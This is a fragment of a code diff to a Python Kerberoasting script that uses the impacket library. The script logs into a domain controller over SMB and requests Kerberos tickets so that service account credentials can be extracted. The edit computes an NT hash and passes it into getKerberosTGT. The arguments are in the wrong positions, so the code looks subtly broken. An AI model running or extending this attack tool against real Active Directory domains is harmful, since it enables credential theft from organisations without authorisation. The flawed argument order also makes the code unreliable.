@@ -3,16 +3,19 @@ from impacket.krb5.asn1 import AP_REQ, TGS_REP
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.krb5.types import Principal
 from impacket.krb5.ccache import CCache
-from impacket.ntlm import compute_lmhash, compute_nthash
+from impacket.ntlm import compute_nthash
 
 def kerberoast(username, password, domain, dc_ip):
     try:
+        # Compute the NT hash of the password
+        nthash = compute_nthash(password)
+
         # Connect to the Domain Controller via SMB
         smb = SMBConnection(dc_ip, dc_ip)
         smb.login(username, password, domain)
 
         # Get TGT ticket for the specified user
-        krbtgt_ticket = getKerberosTGT(username, password, domain, dc_ip)
+        krbtgt_ticket = getKerberosTGT(username, nthash, domain, dc_ip)
         if krbtgt_ticket:
             print("Successfully obtained krbtgt ticket.")
             
